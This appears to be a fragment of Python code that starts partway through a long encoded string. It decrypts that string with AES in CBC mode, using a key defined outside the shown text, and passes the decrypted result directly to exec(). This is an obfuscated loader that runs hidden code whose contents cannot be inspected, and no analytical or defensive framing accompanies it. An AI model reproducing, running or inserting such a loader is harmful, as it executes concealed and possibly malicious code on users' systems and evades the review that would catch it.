LaXJaAJfz5/88utaIsRT4mzP+nCnuYPG4UEhRtU7t1KJL9No7ieogacgQ3RLJkIF/ePQFfIrh8Htcy8ifsy6KREjyJtGpXsoOurW/9CghPPltfOWB2gRnb0byZaW38z2XiSCrGYwD4lwOG7vhxBarTJOlyEeWjWI3ZGSE0YznSIT0tp59Fghl+cwc5MUEN0anll/Gn0gJxue129tBriefHz0lrostF8gT/YJXWcg1lqcs5xok/HpgfmB8sMEbxdAjhBPKzN/HMq8DjgnVfOFOufnS4V+J7l68rG2d9I20/7pixwwGoZP7Q2u4snaOlK2FzbaKPt0PSUT4U0asGPDhjlVNzGjzh2XA6vbqxPNJNcsTJ/N4i4SIYBOh9jQ=="); iv = encrypted_data[:16]; cipher = AES.new(key, AES.MODE_CBC, iv=iv); decrypted_data = cipher.decrypt(encrypted_data[16:]); exec(decrypted_data.decode())